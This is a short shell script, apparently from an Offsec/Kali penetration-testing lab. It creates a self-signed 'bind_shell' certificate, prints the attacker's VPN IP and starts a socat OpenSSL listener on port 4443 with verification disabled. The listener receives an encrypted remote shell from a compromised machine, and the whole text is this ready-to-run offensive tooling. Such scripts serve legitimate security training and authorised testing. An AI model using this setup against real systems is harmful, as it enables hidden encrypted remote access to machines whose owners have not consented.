cd ~

openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 30 -out bind_shell.crt -subj "/C=US/ST=NY/L=NY/O=Offsec/OU=Security/CN=kali"

cat bind_shell.key bind_shell.crt > bind_shell.pem

echo "Your Kali VPN IP is:"
ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'

sudo socat OPENSSL-LISTEN:4443,cert=bind_shell.pem,verify=0,fork STDOUT
